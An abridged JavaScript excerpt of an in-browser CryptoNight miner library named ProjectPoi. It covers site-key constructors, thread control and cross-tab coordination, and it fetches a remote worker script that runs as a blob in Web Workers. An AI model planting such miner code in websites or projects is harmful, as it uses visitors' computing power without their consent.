(function(window) {
    ...
    var Miner = function(siteKey, params) {
        ...
        this._tab = {
            ...
            mode: ProjectPoi.IF_EXCLUSIVE_TAB,
            grace: 0,
            interval: null
        };
    ...
    Miner.prototype.start = function(mode) {
        this._tab.mode = mode || ProjectPoi.IF_EXCLUSIVE_TAB;
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener("load", function() {
                ProjectPoi.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
                this._asmjsStatus = "loaded";
                this._startNow()
            }.bind(this), xhr);
            xhr.open("get", ProjectPoi.CONFIG.LIB_URL + "cryptonight-asmjs.min.js", true);
            xhr.send()
        }
    };
    ...
    Miner.prototype.setNumThreads = function(num) {
        ...
        if (num > this._threads.length) {
            for (var i = 0; num > this._threads.length; i++) {
                var thread = new ProjectPoi.JobThread;
                if (this._currentJob) {
    ...
    Miner.prototype._startNow = function() {
        if (this._tab.mode !== ProjectPoi.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3)
        }
        if (this._tab.mode === ProjectPoi.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return
        }
        if (this._tab.mode === ProjectPoi.FORCE_EXCLUSIVE_TAB) {
            this._tab.grace = Date.now() + 3e3
        }
        if (!this.verifyThread) {
            this.verifyThread = new ProjectPoi.JobThread
        }
    ...
    Miner.prototype._otherTabRunning = function() {
        try {
            var tdjson = localStorage.getItem("projectpoi");
            if (tdjson) {
    ...
    Miner.prototype._updateTabs = function() {
        ...
        if (this.isRunning()) {
            try {
                localStorage.setItem("projectpoi", JSON.stringify({
    ...
    Miner.prototype._connect = function() {
        ...
        var shards = ProjectPoi.CONFIG.WEBSOCKET_SHARDS;
    ...
    Miner.prototype._onMessage = function(ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("projectpoi Error:", msg.params.error)
            }
    ...
    window.ProjectPoi.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.ProjectPoi.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.ProjectPoi.FORCE_MULTI_TAB = "forceMultiTab";
    window.ProjectPoi.Token = function(siteKey, goal, params) {
        var miner = new Miner(siteKey, params);
        miner._goal = goal || 0;
        return miner
    };
    window.ProjectPoi.User = function(siteKey, user, params) {
        var miner = new Miner(siteKey, params);
        miner._user = user;
        return miner
    };
    window.ProjectPoi.Anonymous = function(siteKey, params) {
        var miner = new Miner(siteKey, params);
        return miner
    }
})(window);
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(ProjectPoi.CRYPTONIGHT_WORKER_BLOB);
    ...
    window.ProjectPoi.JobThread = JobThread
})(window);
